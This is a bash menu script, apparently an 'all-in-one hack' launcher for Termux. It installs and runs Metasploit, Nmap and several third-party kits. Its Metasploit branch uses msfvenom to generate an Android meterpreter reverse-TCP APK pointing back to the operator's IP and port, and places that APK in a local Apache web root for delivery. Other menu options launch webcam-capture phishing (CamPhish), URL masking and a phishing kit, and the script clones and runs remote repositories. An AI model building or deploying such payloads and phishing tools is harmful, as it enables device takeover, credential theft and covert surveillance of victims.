#!/bin/bash
#power by Hacking With Gowtham
#Created by Gowtham
seq 1 100|dialog --title "Loading" --gauge "Please wait ..." 11 60 0
sleep 1
clear
echo "Please Enter Your Name"
read -r name
echo "Welcome $name !"
sleep 1.2
clear
echo "(1) Metasploit"
echo "(2) Nmap"
echo "(3) Ping"
echo "(4) CamHack"
echo "(5) IP-Tracer"
echo "(6) Mask URL"
echo "(7) Phishing"
echo "(8) update"
echo "(9) Kali In Termux"
echo "(0) Exit"
########################################################################
echo "Enter The Option " ; read -r post   
#########################################################################
if [ "$post" = "1" ]; then
sleep 3
echo "Did You Alredy Install Metasplot 6 (y/n)"
read -r in
if [ "$in" = "y" ];
then 
echo "Ok You Continue"
elif [ "$in" = "n" ];
then 
cd
git clone https://github.com/gowtham006k/metasploit6-for-termux.git
cd metasploit6-for-termux
bash meta.sh
else 
exit
fi
echo "Did You Alredy Installed Figlet(y/n)"
read -r all

if [ "$all" = "n" ]; 
then
pkg install figlet
elif [ "$all" = "y" ]; 
then
echo "OK!"
else 
exit
fi

###########################Metasploit###################################################
figlet Welcome
sleep 1
clear
figlet To
sleep 1
clear
figlet Metasploit
echo " Hii Gowtham,Welcome"
echo "Do Want To Install Apache?y/n"
read  apac
if [ "$apac" = "y" ];
 then
apt install apache2
echo "Apache2 Sucessfully Installed!"
elif [ "$apac" = "n" ]; 
 then
 echo "Ok You Continue"
else
 exit
fi
sleep 3
clear
echo "Now Let's Start server"
sleep 2
apachectl
echo "Server Has Been Start Successfully!"
cd
cd ..
cd usr/share/apache2/default-site/htdocs
echo "Enter You IP Adress:"
read -r a
echo "Your IP $a"
echo "Enter Port Number:"
read -n 4 b
echo "Your Port Number is $b"
if [ "$b" -gt 2000 ]; then
echo "Sorry! Plese Enter Less Than 2000 For Better Connection"
elif [ "$b" -lt "1000" ]; then
echo "sorry! Please Enter Gerater Than 1000 To connect"
else 
exit
fi
echo "Enter Your APK Name To Generate APK:"
read -r c
msfvenom -p android/meterpreter/reverse_tcp LHOST=$a LPORT=$b R> $c.apk
echo "Result: Your APK Has Been Generated That Will  Sent To Your Local Apache Server.Go To Your Browser And Type 127.0.0.1:8080."
sleep 1
cd
cd metasploit6-for-termux
cd metasploit-framework
./msfconsole
###########################################NMAP############################################################
elif [ "$post" = "2" ]; then 
echo "Wait a second"
echo "Enter An IP(or)URL TO Scan :"
read -r nmap
nmap $nmap 

elif [ "$post" = "0" ]; then
exit
#ping##########################################################
elif [ "$post" = "3" ]; then
clear
echo "Enter An IP or Any Domain:"
read -r net
ping $net
################################################################
#############################CamHack##########################
elif [ "$post" = "4" ]; then 
cd .camhack
cd CamPhish
bash camphish.sh
###############################################################
################################ip tracer######################
elif [ "$post" = "5" ]; then
cd .ip
cd track-ip
./trackip
###############################################################
############################Mask URl###########################
elif [ "$post" = "6" ]; then 
cd .mask
cd maskphish
bash maskphish.sh
###############################################################
###########################phishing############################
elif [ "$post" = "7" ]; then
cd .phisher
cd nexphisher
bash nexhisher
###############################################################
####################update#####################################
elif [ "$post" = "8" ];then
cd 
git clone https://github.com/gowtham006k/allinonehack
###############################################################
#Kali OS ######################################################
elif [ "$post" = "9" ]; then
echo "(1) Run Kali Linux"
echo "(2) Install Kali Linux"

read -r os
if [ "$os" = "1" ]; then
nh
elif [ "$os" = "2" ]; then
cd .kali
clear
bash install-nethunter-termux
fi
##################################################################################
############invali option#######################################################
else 
echo "invalid input!"
fi
